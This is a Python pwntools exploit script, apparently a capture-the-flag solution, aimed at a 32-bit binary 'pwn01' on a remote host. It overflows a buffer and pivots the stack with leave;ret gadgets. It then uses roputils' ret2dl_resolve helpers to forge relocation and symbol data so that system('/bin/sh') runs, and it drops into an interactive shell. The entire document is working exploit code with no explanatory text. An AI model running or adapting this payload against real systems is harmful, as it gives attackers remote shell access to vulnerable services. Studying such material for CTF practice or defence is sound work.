from pwn import *
from roputils import *

context.log_level = 'debug'
p = remote("39.100.87.24",8101)
#p = process('./pwn01')
elf = ELF('./pwn01')
rop = ROP('./pwn01')
read_plt = 0x08048300
ppp_ret = 0x08048519 #pop esi ; pop edi ; pop ebp ; ret

leave_ret = 0x080483c5 #mov esp,ebp;pop ebp;ret
base_stage = 0x0804A020 + 0x800
fake_esp = 0x0804A020 + 0x600
payload = 'a'*14 + p32(0x0804A040+4+0x100) + p32(fake_esp)*2
payload = payload.ljust(0x100,'\x00')
payload += p32(read_plt) + p32(ppp_ret) 
payload += p32(0) + p32(fake_esp) + p32(fake_esp)
payload += p32(leave_ret)
#gdb.attach(p,'b *0x80483c6')
p.sendline(payload)

time.sleep(2)
# used to call dl_Resolve()
payload = 'aaaa' 
payload += rop.call('read',0,base_stage,100)
## used to call dl_Resolve()
payload += rop.dl_resolve_call(base_stage + 20,base_stage)
p.sendline(payload)
time.sleep(2)

payload = rop.string('/bin/sh')
payload += rop.fill(20,payload)
## used to make faking data, such relocation, Symbol, Str
payload += rop.dl_resolve_data(base_stage + 20, 'system')
payload += rop.fill(100,payload)
p.send(payload)
p.interactive()